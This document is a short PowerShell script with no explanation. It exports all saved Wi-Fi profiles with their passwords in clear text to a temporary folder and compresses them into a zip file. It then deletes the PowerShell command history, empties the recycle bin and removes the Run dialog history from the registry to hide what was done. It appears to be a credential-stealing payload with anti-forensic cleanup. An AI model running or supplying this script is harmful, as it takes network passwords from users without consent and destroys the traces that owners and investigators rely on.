mkdir "$env:TEMP\wifi"

netsh wlan show profiles

netsh wlan export profile key=clear folder="$env:TEMP\wifi"

Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
